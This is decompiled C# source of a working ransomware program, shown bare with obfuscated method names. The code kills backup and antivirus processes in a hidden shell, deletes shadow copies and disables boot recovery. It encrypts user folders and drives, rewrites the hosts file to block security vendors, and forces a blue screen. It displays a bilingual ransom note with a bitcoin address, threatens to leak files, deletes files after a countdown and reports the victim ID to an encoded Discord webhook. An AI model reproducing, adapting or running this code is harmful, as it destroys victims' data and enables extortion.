		processStartInfo.Arguments = "/c taskkill /F /IM BackupExecAgentBrowser* & taskkill /F /IM BackupExecDiveciMediaService* & taskkill /F /IM BackupExecJobEngine* & taskkill /F /IM BackupExecManagementService* & taskkill /F /IM vss* & taskkill /F /IM sql* & taskkill /F /IM svc$* & taskkill /F /IM memtas* & taskkill /F /IM sophos* & taskkill /F /IM veeam* & taskkill /F /IM backup* & taskkill /F /IM GxVss* & taskkill /F /IM GxBlr* & taskkill /F /IM GxFWD* & taskkill /F /IM GxCVD* & taskkill /F /IM GxCIMgr* & taskkill /F /IM DefWatch* & taskkill /F /IM ccEvtMgr* & taskkill /F /IM SavRoam* & taskkill /F /IM RTVscan* & taskkill /F /IM QBFCService* & taskkill /F /IM Intuit.QuickBooks.FCS* & taskkill /F /IM YooBackup* & taskkill /F /IM YooIT* & taskkill /F /IM zhudongfangyu* & taskkill /F /IM sophos* & taskkill /F /IM stc_raw_agent* & taskkill /F /IM VSNAPVSS* & taskkill /F /IM QBCFMonitorService* & taskkill /F /IM VeeamTransportSvc* & taskkill /F /IM VeeamDeploymentService* & taskkill /F /IM VeeamNFSSvc* & taskkill /F /IM veeam* & taskkill /F /IM PDVFSService* & taskkill /F /IM BackupExecVSSProvider* & taskkill /F /IM BackupExecAgentAccelerator* & taskkill /F /IM BackupExecRPCService* & taskkill /F /IM AcrSch2Svc* & taskkill /F /IM AcronisAgent* & taskkill /F /IM CASAD2DWebSvc* & taskkill /F /IM CAARCUpdateSvc* & taskkill /F /IM TeamViewer*";
		Process.Start(processStartInfo);
	}

	public void OXFmckrnVGgOoGVxpjWnii()
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.Arguments = "/c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet";
		Process.Start(processStartInfo);
	}

	public void qwlSOnEkkzRcLkGyCOSapa(int minutes)
	{
		try
		{
			bool flag = true;
			while (flag)
			{
				string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
				if (File.Exists(folderPath + "\\time"))
				{
					hora = File.ReadAllText(folderPath + "\\time");
				}
				else
				{
					hora = DateTime.UtcNow.Day.ToString() + "/" + DateTime.UtcNow.Month.ToString() + "/" + DateTime.UtcNow.Year.ToString() + " " + DateTime.UtcNow.Hour + ":" + DateTime.UtcNow.Minute + ":" + DateTime.UtcNow.Second;
					File.WriteAllText(folderPath + "\\time", hora);
				}
				string s = DateTime.UtcNow.Day.ToString() + "/" + DateTime.UtcNow.Month.ToString() + "/" + DateTime.UtcNow.Year.ToString() + " " + DateTime.UtcNow.Hour + ":" + DateTime.UtcNow.Minute + ":" + DateTime.UtcNow.Second;
				TimeSpan timeSpan = DateTime.Parse(hora, CultureInfo.CreateSpecificCulture("es-ES")).AddMinutes(minutes) - DateTime.Parse(s, CultureInfo.CreateSpecificCulture("es-ES"));
				Console.WriteLine(timeSpan.ToString());
				if (timeSpan.ToString().Contains("-") | ((timeSpan.Seconds == 0) & (timeSpan.Minutes == 0) & (timeSpan.Hours == 0) & (timeSpan.Days == 0)))
				{
					IntPtr consoleWindow = GetConsoleWindow();
					ShowWindow(consoleWindow, 0);
					bsod("off");
					Console.WriteLine("time is up!");
					flag = false;
					xJLlHmTSUNMQAleGpyNDJhcMJzUX("C:\\Users");
				}
				IntPtr consoleWindow2 = GetConsoleWindow();
				ShowWindow(consoleWindow2, 5);
				Console.BackgroundColor = ConsoleColor.DarkRed;
				Console.ForegroundColor = ConsoleColor.White;
				Console.Clear();
				Console.Title = "";
				string text = "  _____                   ______          _    _            _             \r\n |  __ \\                 |  ____|        | |  | |          | |            \r\n | |__) |__ _  __ _ ___  | |__ _   _  ___| | _| | ___   ___| | _____ _ __ \r\n |  _  // _` |/ _` / __| |  __| | | |/ __| |/ / |/ _ \\ / __| |/ / _ \\ '__|\r\n | | \\ \\ (_| | (_| \\__ \\ | |  | |_| | (__|   <| | (_) | (__|   <  __/ |   \r\n |_|  \\_\\__,_|\\__,_|___/ |_|   \\__,_|\\___|_|\\_\\_|\\___/ \\___|_|\\_\\___|_|   \r\n                                                                          \r\n                                                                          \r\n\r\n\r\nYour files have been encrypted with   _____                   ______          _    _            _             \r\n |  __ \\                 |  ____|        | |  | |          | |            \r\n | |__) |__ _  __ _ ___  | |__ _   _  ___| | _| | ___   ___| | _____ _ __ \r\n |  _  // _` |/ _` / __| |  __| | | |/ __| |/ / |/ _ \\ / __| |/ / _ \\ '__|\r\n | | \\ \\ (_| | (_| \\__ \\ | |  | |_| | (__|   <| | (_) | (__|   <  __/ |   \r\n |_|  \\_\\__,_|\\__,_|___/ |_|   \\__,_|\\___|_|\\_\\_|\\___/ \\___|_|\\_\\___|_|   \r\n                                                                          \r\n                                                                          \r\n\r\n\r\n\r\nGreetings, %USERNAME%, Your documents, photos, videos, databases and other important files have been encrypted with the strongest and most advanced encryption of military level and with a unique key, generated for this team.\r\n\r\n-------------------------------------------------- -------------------------------------------------- --------------------------------------------\r\n\r\n\r\n\r\nDon't worry you can recover everything!\r\n\r\nThe private decryption key is stored on a dark web server on a secret server and no one can decrypt your files until you pay for it and get it.\r\n\r\n\r\nYou have 50 hours to send the payment, if you do not send the money within the time provided, all your files will be permanently deleted and you will never be able to recover them.\r\n\r\nA copy of all your files was sent to a server, if you do not pay, the extracted information will be disclosed. Do not hesitate that I will leak data and intimate files in deep web forums.\r\n\r\n-------------------------------------------------- -------------------------------------------------- --------------------------------------------\r\n\r\nPayment will be made in p2p currency such as bitcoin, to the following address:\r\nbc1q9rpycnqamtpek76lrwxm6j8rhxtwdzzzsuccx4\r\n\r\nYou can buy bitcoin at localbitcoins.com\r\n\r\ntotal to pay $300 dls\r\n\r\nWhen you have canceled everything, send the information to the following email: helpclients@protonmail.com\r\nwith your id (%PERSONALID%) and your private ip (%PRIVATEIP%)\r\n-------------------------------------------------- -------------------------------------------------- --------------------------------------------\r\nNote: Do not try to use decryption with any online tool, because you will lose all files.\r\nDo not force close the program you will generate an infinite bsdo, just contact me, we will solve it together.\r\n\r\nthe following list of files have been successfully encrypted,\r\n%ENCRYPTEDFILES%\r\nbeing a total of %NUMBERFILES% encrypted.\r\n\r\n\r\n-------------------------------------------------- -------------------------------------------------- ------------------------------------------------------------------------------------------------------------------\r\n\r\n\r\n\r\n  _____                   ______          _    _            _             \r\n |  __ \\                 |  ____|        | |  | |          | |            \r\n | |__) |__ _  __ _ ___  | |__ _   _  ___| | _| | ___   ___| | _____ _ __ \r\n |  _  // _` |/ _` / __| |  __| | | |/ __| |/ / |/ _ \\ / __| |/ / _ \\ '__|\r\n | | \\ \\ (_| | (_| \\__ \\ | |  | |_| | (__|   <| | (_) | (__|   <  __/ |   \r\n |_|  \\_\\__,_|\\__,_|___/ |_|   \\__,_|\\___|_|\\_\\_|\\___/ \\___|_|\\_\\___|_|   \r\n                                                                          \r\n                                                                          \r\n\r\n\r\nTus archivos se han cifrado con   _____                   ______          _    _            _             \r\n |  __ \\                 |  ____|        | |  | |          | |            \r\n | |__) |__ _  __ _ ___  | |__ _   _  ___| | _| | ___   ___| | _____ _ __ \r\n |  _  // _` |/ _` / __| |  __| | | |/ __| |/ / |/ _ \\ / __| |/ / _ \\ '__|\r\n | | \\ \\ (_| | (_| \\__ \\ | |  | |_| | (__|   <| | (_) | (__|   <  __/ |   \r\n |_|  \\_\\__,_|\\__,_|___/ |_|   \\__,_|\\___|_|\\_\\_|\\___/ \\___|_|\\_\\___|_|   \r\n                                                                          \r\n                                                                          \r\n\r\n\r\n\r\nSaludos, %USERNAME%, Tus documentos, fotografias,, videos, bases de datos y demas archivos importantes han sido cifrados con el cifrado mas fuerte y avanzado de nivel militar y con una unica clave, generada para este equipo.\r\n\r\n------------------------------------------------------------------------------------------------------------------------------------------------\r\n\r\n¡No te preocupes puedes recuperar todo!\r\n\r\nLa clave de descifrado privada se almacena en un servidor en la red oscura en un servidor secreto y nadie puede descifrar tus archivos hasta que pagues por ella y la obtengas.\r\n\r\n\r\nTienes 50 horas para enviar el pago, si tu no envias el dinero dentro del tiempo proporcionado, todos tus archivos se eliminaran permanentemente y no podras recuperarlos jamas.\r\n\r\nSe envio una copia de todos tus archivos a un servidor, si no pagas, se divulgara la informacion extraida. no dudes en que filtrare datos y archivos intimos en foros de la deep web.\r\n\r\n------------------------------------------------------------------------------------------------------------------------------------------------\r\n\r\n\r\n\r\nEl pago se realizara en moneda p2p como es bitcoin, al siguiente direccion:\r\nbc1q9rpycnqamtpek76lrwxm6j8rhxtwdzzzsuccx4\r\n\r\nPuedes comprar bitcoin en localbitcoins.com\r\n\r\ntotal a pagar $300 dls\r\n\r\ncuando hayas cancelado todo, manda la informacion al siguiente correo: helpclients@protonmail.com \r\ncon tu id (%PERSONALID%) y tu ip privada (%PRIVATEIP%)\r\n------------------------------------------------------------------------------------------------------------------------------------------------\r\nNota: no intentes usar un descifrado con alguna herramienta online, porque perederas todos los archivos.\r\nNo fuerces cerrar el programa generaras un bsdo infinito, solo ponte en contacto conmigo, lo resolveremos juntos.\r\n\r\nla siguiente lista de archivos han sido encriptados correctamente, \r\n%ENCRYPTEDFILES%\r\nsiendo un total de %NUMBERFILES% encriptados.".Replace("%PERSONALID%", ID).Replace("%USERNAME%", Environment.UserName).Replace("%COMPUTERNAME%", Environment.MachineName)
					.Replace("%DATE%", DateTime.UtcNow.ToString())
					.Replace("%PRIVATEIP%", DsQqYUXMkSfYUhmvvtwYmI())
					.Replace("%ENCRYPTEDFILES%", nbqHdvjfXleHEIFzqRstvxbkFHgZ)
					.Replace("%NUMBERFILES%", dDFXdAkOTpyxMWqewEtREdqBVILf.ToString());
				if (text.Contains("%TIME%"))
				{
					text = text.Replace("%TIME%", timeSpan.ToString().Replace(".", ":"));
				}
				Console.Write(text);
				Thread.Sleep(1000);
				Console.Clear();
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}

	public void xJLlHmTSUNMQAleGpyNDJhcMJzUX(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			string[] directories = Directory.GetDirectories(location);
			for (int i = 0; i < files.Length; i++)
			{
				string extension = Path.GetExtension(files[i]);
				if (extension == ".Fucklocker")
				{
					File.Delete(files[i]);
				}
			}
			for (int i = 0; i < directories.Length; i++)
			{
				xJLlHmTSUNMQAleGpyNDJhcMJzUX(directories[i]);
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}

	private static void bsod(string mode)
	{
		if (mode == "off")
		{
			NtSetInformationProcess(Process.GetCurrentProcess().Handle, KQNAbJSrqBIoLsQyCEEmPo, ref notITrnhAVxbuMyYwicjsmpFu, 4);
		}
	}

	public void start()
	{
		//IL_0e3e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e45: Expected O, but got Unknown
		try
		{
			if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + "\\image.jpg"))
			{
				File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + "\\image.jpg");
			}
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
			string location = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads");
			string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
			string folderPath3 = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
			string folderPath4 = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
			string folderPath5 = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);
			string location2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "3D Objects");
			string location3 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "OneDrive");
			password = "/9mKxVSVZyoJIjB&!lDQ9ZwG";
			password = CreatePassword();
			string folderPath6 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			bsod("on");
			nRNaIyYicAkjDijKnSwEqX = LFIWiRCcDsueZSjZIGMBGaCfqkNb(25);
			if (Directory.Exists(folderPath6 + "\\" + nRNaIyYicAkjDijKnSwEqX))
			{
				Directory.Delete(folderPath6 + "\\" + nRNaIyYicAkjDijKnSwEqX);
			}
			Directory.CreateDirectory(folderPath6 + "\\" + nRNaIyYicAkjDijKnSwEqX);
			string text = "si";
			if (File.Exists(folderPath6 + "\\ID"))
			{
				text = "no";
				StreamReader streamReader = new StreamReader(folderPath6 + "\\ID");
				ID = streamReader.ReadToEnd();
				streamReader.Close();
			}
			else
			{
				ID = LFIWiRCcDsueZSjZIGMBGaCfqkNb(40);
				StreamWriter streamWriter = new StreamWriter(folderPath6 + "\\ID");
				streamWriter.Write(ID);
				streamWriter.Close();
			}
			Environment.ExpandEnvironmentVariables("%ALLUSERSPROFILE%");
			Environment.ExpandEnvironmentVariables("%APPDATA%");
			Environment.ExpandEnvironmentVariables("%COMPUTERNAME%");
			Environment.ExpandEnvironmentVariables("%COMMONPROGRAMFILES%");
			Environment.ExpandEnvironmentVariables("%COMMONPROGRAMFILES(x86)%");
			Environment.ExpandEnvironmentVariables("%COMSPEC%");
			Environment.ExpandEnvironmentVariables("%HOMEDRIVE%");
			Environment.ExpandEnvironmentVariables("%HOMEPATH%");
			Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%");
			Environment.ExpandEnvironmentVariables("%LOGONSERVER%");
			Environment.ExpandEnvironmentVariables("%PATH%");
			Environment.ExpandEnvironmentVariables("%PATHEXT%");
			Environment.ExpandEnvironmentVariables("%PROGRAMFILES%");
			Environment.ExpandEnvironmentVariables("%PROGRAMFILES(X86)%");
			Environment.ExpandEnvironmentVariables("%PROMPT%");
			Environment.ExpandEnvironmentVariables("%SYSTEMDRIVE%");
			Environment.ExpandEnvironmentVariables("%SYSTEMROOT%");
			Environment.ExpandEnvironmentVariables("%TEMP%");
			Environment.ExpandEnvironmentVariables("%USERDOMAIN%");
			Environment.ExpandEnvironmentVariables("%USERNAME%");
			Environment.ExpandEnvironmentVariables("%USERPROFILE%");
			Environment.ExpandEnvironmentVariables("%WINDIR%");
			Environment.ExpandEnvironmentVariables("%PUBLIC%");
			Environment.ExpandEnvironmentVariables("%PSMODULEPATH%");
			services();
			nebuPfARYQtqMlhkAMmVyQkeprKQ(location, password);
			nebuPfARYQtqMlhkAMmVyQkeprKQ(folderPath2, password);
			nebuPfARYQtqMlhkAMmVyQkeprKQ(folderPath3, password);
			nebuPfARYQtqMlhkAMmVyQkeprKQ(folderPath4, password);
			nebuPfARYQtqMlhkAMmVyQkeprKQ(folderPath5, password);
			nebuPfARYQtqMlhkAMmVyQkeprKQ(location2, password);
			nebuPfARYQtqMlhkAMmVyQkeprKQ(location3, password);
			nebuPfARYQtqMlhkAMmVyQkeprKQ(folderPath, password);
			File.WriteAllText("C:\\Windows\\System32\\drivers\\etc\\hosts", "127.0.0.1 localhost" + Environment.NewLine + "127.0.0.1 files.avast.com" + Environment.NewLine + "127.0.0.1 www.files.avast.com" + Environment.NewLine + "127.0.0.1 bits.avcdn.net" + Environment.NewLine + "127.0.0.1 www.bits.avcdn.net" + Environment.NewLine + "127.0.0.1 download.eset.com" + Environment.NewLine + "127.0.0.1 www.download.eset.com" + Environment.NewLine + "127.0.0.1 dw89.uptodown.com" + Environment.NewLine + "127.0.0.1 www.dw89.uptodown.com" + Environment.NewLine + "127.0.0.1 pdc1.fra5.pdc.kaspersky.com" + Environment.NewLine + "127.0.0.1 www.pdc1.fra5.pdc.kaspersky.com" + Environment.NewLine + "127.0.0.1 dm.kaspersky - labs.com" + Environment.NewLine + "127.0.0.1 www.dm.kaspersky - labs.com" + Environment.NewLine + "127.0.0.1 install.avira - update.com" + Environment.NewLine + "127.0.0.1 www.install.avira - update.com" + Environment.NewLine + "127.0.0.1 package.avira.com" + Environment.NewLine + "127.0.0.1 www.package.avira.com" + Environment.NewLine + "127.0.0.1 bitdefender.com.tr" + Environment.NewLine + "127.0.0.1 www.bitdefender.com.tr" + Environment.NewLine + "127.0.0.1 www.bitdefender.com" + Environment.NewLine + "127.0.0.1 bitdefender.com" + Environment.NewLine + "127.0.0.1 download.bitdefender.com" + Environment.NewLine + "127.0.0.1 www.download.bitdefender.com" + Environment.NewLine + "127.0.0.1 download.mcafee.com" + Environment.NewLine + "127.0.0.1 www.download.mcafee.com" + Environment.NewLine + "127.0.0.1 buy - download.norton.com" + Environment.NewLine + "127.0.0.1 www.buy - download.norton.com" + Environment.NewLine + "127.0.0.1 free.360totalsecurity.com" + Environment.NewLine + "127.0.0.1 www.free.360totalsecurity.com" + Environment.NewLine + "127.0.0.1 data - cdn.mbamupdates.com" + Environment.NewLine + "127.0.0.1 www.data - cdn.mbamupdates.com" + Environment.NewLine + "127.0.0.1 download.bleepingcomputer.com" + Environment.NewLine + "127.0.0.1 www.download.bleepingcomputer.com" + Environment.NewLine + "127.0.0.1 app.depo - tamindir.com" + Environment.NewLine + "127.0.0.1 www.app.depo - tamindir.com" + Environment.NewLine + "127.0.0.1 www.gsf - sp.softonic.com" + Environment.NewLine + "127.0.0.1 gsf - sp.softonic.com" + Environment.NewLine + "127.0.0.1 cdn.iobit.com" + Environment.NewLine + "127.0.0.1 www.cdn.iobit.com" + Environment.NewLine + "127.0.0.1 download.ccleaner.com" + Environment.NewLine + "127.0.0.1 www.download.ccleaner.com" + Environment.NewLine + "127.0.0.1 update.iobit.com" + Environment.NewLine + "127.0.0.1 www.update.iobit.com" + Environment.NewLine + "127.0.0.1 h2ocdn.lavasoft.com" + Environment.NewLine + "127.0.0.1 www.h2ocdn.lavasoft.com" + Environment.NewLine + "127.0.0.1 devbuilds.s.kaspersky - labs.com" + Environment.NewLine + "127.0.0.1 www.devbuilds.s.kaspersky - labs.com" + Environment.NewLine + "127.0.0.1 virustotal.com" + Environment.NewLine + "127.0.0.1 www.virustotal.com" + Environment.NewLine + "127.0.0.1 www.pandasecurity.com" + Environment.NewLine + "127.0.0.1 pandasecurity.com" + Environment.NewLine + "127.0.0.1 www.f - secure.com" + Environment.NewLine + "127.0.0.1 f - secure.com" + Environment.NewLine + "127.0.0.1 www.trendmicro.com" + Environment.NewLine + "127.0.0.1 trendmicro.com" + Environment.NewLine + "127.0.0.1 download.geo.drweb.com" + Environment.NewLine + "127.0.0.1 www.download.geo.drweb.com" + Environment.NewLine + "127.0.0.1 download.microsoft.com" + Environment.NewLine + "127.0.0.1 www.download.microsoft.com" + Environment.NewLine + "127.0.0.1 dw2.uptodown.com" + Environment.NewLine + "127.0.0.1 www.dw2.uptodown.com" + Environment.NewLine + "127.0.0.1 www.oneindir.com" + Environment.NewLine + "127.0.0.1 oneindir.com" + Environment.NewLine + "127.0.0.1 www.enigmasoftware.com" + Environment.NewLine + "127.0.0.1 enigmasoftware.com" + Environment.NewLine + "127.0.0.1 c.computerbild.de" + Environment.NewLine + "127.0.0.1 www.c.computerbild.de" + Environment.NewLine + "127.0.0.1 dw32.uptodown.com" + Environment.NewLine + "127.0.0.1 www.dw32.uptodown.com" + Environment.NewLine + "127.0.0.1 dl3.vessoft.com" + Environment.NewLine + "127.0.0.1 www.dl3.vessoft.com" + Environment.NewLine + "127.0.0.1 prod.downloadnow.com" + Environment.NewLine + "127.0.0.1 www.prod.downloadnow.com" + Environment.NewLine + "127.0.0.1 download.findmysoft.com" + Environment.NewLine + "127.0.0.1 www.download.findmysoft.com" + Environment.NewLine + "127.0.0.1 dw26.uptodown.com" + Environment.NewLine + "127.0.0.1 www.dw26.uptodown.com" + Environment.NewLine + "127.0.0.1 www.uptodown.com" + Environment.NewLine + "127.0.0.1 uptodown.com" + Environment.NewLine + "127.0.0.1 avast - home.tr.uptodown.com" + Environment.NewLine + "127.0.0.1 www.avast - home.tr.uptodown.com" + Environment.NewLine + "127.0.0.1 malwarebytes - anti - malware.tr.uptodown.com" + Environment.NewLine + "127.0.0.1 www.malwarebytes - anti - malware.tr.uptodown.com" + Environment.NewLine + "127.0.0.1 nod32.tr.uptodown.com" + Environment.NewLine + "127.0.0.1 www.nod32.tr.uptodown.com" + Environment.NewLine + "127.0.0.1 avg - free.tr.uptodown.com" + Environment.NewLine + "127.0.0.1 www.avg - free.tr.uptodown.com" + Environment.NewLine + "127.0.0.1 www.chip.de" + Environment.NewLine + "127.0.0.1 chip.de" + Environment.NewLine + "127.0.0.1 www.computerbild.de" + Environment.NewLine + "127.0.0.1 computerbild.de" + Environment.NewLine + "127.0.0.1 www.heise.de" + Environment.NewLine + "127.0.0.1 heise.de" + Environment.NewLine + "127.0.0.1 www.computerbase.de" + Environment.NewLine + "127.0.0.1 computerbase.de" + Environment.NewLine + "127.0.0.1 youtube.com" + Environment.NewLine + "127.0.0.1 www.youtube.com");
			lSDeCACpnfBpuoEXZrzZLb();
			nebuPfARYQtqMlhkAMmVyQkeprKQ("C:", password);
			mensaje("C:");
			messageCreator("C:");
			nebuPfARYQtqMlhkAMmVyQkeprKQ("D:", password);
			mensaje("D:");
			messageCreator("D:");
			nebuPfARYQtqMlhkAMmVyQkeprKQ("E:", password);
			mensaje("E:");
			messageCreator("E:");
			nebuPfARYQtqMlhkAMmVyQkeprKQ("F:", password);
			mensaje("F:");
			messageCreator("F:");
			nebuPfARYQtqMlhkAMmVyQkeprKQ("G:", password);
			mensaje("G:");
			messageCreator("G:");
			nebuPfARYQtqMlhkAMmVyQkeprKQ("H:", password);
			mensaje("H:");
			messageCreator("H:");
			nebuPfARYQtqMlhkAMmVyQkeprKQ("J:", password);
			mensaje("J:");
			messageCreator("J:");
			nebuPfARYQtqMlhkAMmVyQkeprKQ("K:", password);
			mensaje("K:");
			messageCreator("K:");
			string[] contents = new string[1] { "  _____                   ______          _    _            _             \r\n |  __ \\                 |  ____|        | |  | |          | |            \r\n | |__) |__ _  __ _ ___  | |__ _   _  ___| | _| | ___   ___| | _____ _ __ \r\n |  _  // _` |/ _` / __| |  __| | | |/ __| |/ / |/ _ \\ / __| |/ / _ \\ '__|\r\n | | \\ \\ (_| | (_| \\__ \\ | |  | |_| | (__|   <| | (_) | (__|   <  __/ |   \r\n |_|  \\_\\__,_|\\__,_|___/ |_|   \\__,_|\\___|_|\\_\\_|\\___/ \\___|_|\\_\\___|_|   \r\n                                                                          \r\n                                                                          \r\n\r\n\r\nYour files have been encrypted with   _____                   ______          _    _            _             \r\n |  __ \\                 |  ____|        | |  | |          | |            \r\n | |__) |__ _  __ _ ___  | |__ _   _  ___| | _| | ___   ___| | _____ _ __ \r\n |  _  // _` |/ _` / __| |  __| | | |/ __| |/ / |/ _ \\ / __| |/ / _ \\ '__|\r\n | | \\ \\ (_| | (_| \\__ \\ | |  | |_| | (__|   <| | (_) | (__|   <  __/ |   \r\n |_|  \\_\\__,_|\\__,_|___/ |_|   \\__,_|\\___|_|\\_\\_|\\___/ \\___|_|\\_\\___|_|   \r\n                                                                          \r\n                                                                          \r\n\r\n\r\n\r\nGreetings, %USERNAME%, Your documents, photos, videos, databases and other important files have been encrypted with the strongest and most advanced encryption of military level and with a unique key, generated for this team.\r\n\r\n-------------------------------------------------- -------------------------------------------------- --------------------------------------------\r\n\r\n\r\n\r\nDon't worry you can recover everything!\r\n\r\nThe private decryption key is stored on a dark web server on a secret server and no one can decrypt your files until you pay for it and get it.\r\n\r\n\r\nYou have 50 hours to send the payment, if you do not send the money within the time provided, all your files will be permanently deleted and you will never be able to recover them.\r\n\r\nA copy of all your files was sent to a server, if you do not pay, the extracted information will be disclosed. Do not hesitate that I will leak data and intimate files in deep web forums.\r\n\r\n-------------------------------------------------- -------------------------------------------------- --------------------------------------------\r\n\r\nPayment will be made in p2p currency such as bitcoin, to the following address:\r\nbc1q9rpycnqamtpek76lrwxm6j8rhxtwdzzzsuccx4\r\n\r\nYou can buy bitcoin at localbitcoins.com\r\n\r\ntotal to pay $300 dls\r\n\r\nWhen you have canceled everything, send the information to the following email: helpclients@protonmail.com\r\nwith your id (%PERSONALID%) and your private ip (%PRIVATEIP%)\r\n-------------------------------------------------- -------------------------------------------------- --------------------------------------------\r\nNote: Do not try to use decryption with any online tool, because you will lose all files.\r\nDo not force close the program you will generate an infinite bsdo, just contact me, we will solve it together.\r\n\r\nthe following list of files have been successfully encrypted,\r\n%ENCRYPTEDFILES%\r\nbeing a total of %NUMBERFILES% encrypted.\r\n\r\n\r\n-------------------------------------------------- -------------------------------------------------- ------------------------------------------------------------------------------------------------------------------\r\n\r\n\r\n\r\n  _____                   ______          _    _            _             \r\n |  __ \\                 |  ____|        | |  | |          | |            \r\n | |__) |__ _  __ _ ___  | |__ _   _  ___| | _| | ___   ___| | _____ _ __ \r\n |  _  // _` |/ _` / __| |  __| | | |/ __| |/ / |/ _ \\ / __| |/ / _ \\ '__|\r\n | | \\ \\ (_| | (_| \\__ \\ | |  | |_| | (__|   <| | (_) | (__|   <  __/ |   \r\n |_|  \\_\\__,_|\\__,_|___/ |_|   \\__,_|\\___|_|\\_\\_|\\___/ \\___|_|\\_\\___|_|   \r\n                                                                          \r\n                                                                          \r\n\r\n\r\nTus archivos se han cifrado con   _____                   ______          _    _            _             \r\n |  __ \\                 |  ____|        | |  | |          | |            \r\n | |__) |__ _  __ _ ___  | |__ _   _  ___| | _| | ___   ___| | _____ _ __ \r\n |  _  // _` |/ _` / __| |  __| | | |/ __| |/ / |/ _ \\ / __| |/ / _ \\ '__|\r\n | | \\ \\ (_| | (_| \\__ \\ | |  | |_| | (__|   <| | (_) | (__|   <  __/ |   \r\n |_|  \\_\\__,_|\\__,_|___/ |_|   \\__,_|\\___|_|\\_\\_|\\___/ \\___|_|\\_\\___|_|   \r\n                                                                          \r\n                                                                          \r\n\r\n\r\n\r\nSaludos, %USERNAME%, Tus documentos, fotografias,, videos, bases de datos y demas archivos importantes han sido cifrados con el cifrado mas fuerte y avanzado de nivel militar y con una unica clave, generada para este equipo.\r\n\r\n------------------------------------------------------------------------------------------------------------------------------------------------\r\n\r\n¡No te preocupes puedes recuperar todo!\r\n\r\nLa clave de descifrado privada se almacena en un servidor en la red oscura en un servidor secreto y nadie puede descifrar tus archivos hasta que pagues por ella y la obtengas.\r\n\r\n\r\nTienes 50 horas para enviar el pago, si tu no envias el dinero dentro del tiempo proporcionado, todos tus archivos se eliminaran permanentemente y no podras recuperarlos jamas.\r\n\r\nSe envio una copia de todos tus archivos a un servidor, si no pagas, se divulgara la informacion extraida. no dudes en que filtrare datos y archivos intimos en foros de la deep web.\r\n\r\n------------------------------------------------------------------------------------------------------------------------------------------------\r\n\r\n\r\n\r\nEl pago se realizara en moneda p2p como es bitcoin, al siguiente direccion:\r\nbc1q9rpycnqamtpek76lrwxm6j8rhxtwdzzzsuccx4\r\n\r\nPuedes comprar bitcoin en localbitcoins.com\r\n\r\ntotal a pagar $300 dls\r\n\r\ncuando hayas cancelado todo, manda la informacion al siguiente correo: helpclients@protonmail.com \r\ncon tu id (%PERSONALID%) y tu ip privada (%PRIVATEIP%)\r\n------------------------------------------------------------------------------------------------------------------------------------------------\r\nNota: no intentes usar un descifrado con alguna herramienta online, porque perederas todos los archivos.\r\nNo fuerces cerrar el programa generaras un bsdo infinito, solo ponte en contacto conmigo, lo resolveremos juntos.\r\n\r\nla siguiente lista de archivos han sido encriptados correctamente, \r\n%ENCRYPTEDFILES%\r\nsiendo un total de %NUMBERFILES% encriptados.".Replace("%PERSONALID%", ID).Replace("%USERNAME%", Environment.UserName).Replace("%COMPUTERNAME%", Environment.MachineName)
				.Replace("%DATE%", DateTime.UtcNow.ToString())
				.Replace("%PRIVATEIP%", DsQqYUXMkSfYUhmvvtwYmI())
				.Replace("%ENCRYPTEDFILES%", nbqHdvjfXleHEIFzqRstvxbkFHgZ)
				.Replace("%NUMBERFILES%", dDFXdAkOTpyxMWqewEtREdqBVILf.ToString()) };
			mensaje(folderPath);
			mensaje(location);
			mensaje(folderPath2);
			mensaje(folderPath3);
			mensaje(folderPath4);
			mensaje(folderPath5);
			mensaje(location2);
			mensaje(location3);
			messageCreator(folderPath);
			messageCreator(location);
			messageCreator(folderPath2);
			messageCreator(folderPath3);
			messageCreator(folderPath4);
			messageCreator(folderPath5);
			messageCreator(location2);
			messageCreator(location3);
			if (!(rClHiCwOubDvcQVPHHZcGc == "no"))
			{
				if (File.Exists(folderPath6 + "\\README.txt"))
				{
					File.Delete(folderPath6 + "\\README.txt");
				}
				File.WriteAllLines(folderPath6 + "\\README.txt", contents);
				Process.Start(folderPath6 + "\\README.txt");
			}
			SHEmptyRecycleBin(IntPtr.Zero, Environment.GetFolderPath(Environment.SpecialFolder.Windows).Replace("windows", "").Replace("WINDOWS", "")
				.Replace("Windows", ""), 7u);
			NotifyIcon val = new NotifyIcon();
			val.set_Visible(true);
			val.set_Icon(SystemIcons.get_Asterisk());
			val.set_BalloonTipText("notmen");
			val.set_BalloonTipTitle("titmen");
			string text2 = "no";
			OXFmckrnVGgOoGVxpjWnii();
			nrlAHHrqnMOvgCKEJSVZrXAcobms();
			VfCbchHzeUGQjMJLwKrfqnyyveTq();
			while (text2 == "no")
			{
				if (NetworkInterface.GetIsNetworkAvailable())
				{
					if (text == "si")
					{
						webhooks.Main(KDbDpnhifQfnLwbtxggCQDdioVXD("aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTAzMTc0MTA2MjkwMjk4ODg3MC9HdVlyRHR1T2JQcjlLQnFFR2tRUFFhZURoWl9hR1BxLWJveHFqcHpOOFZ5MFdkaDVyU3pJanFtY0pfVzRtUVh5M1hZSg=="), ID);
					}
					text2 = "si";
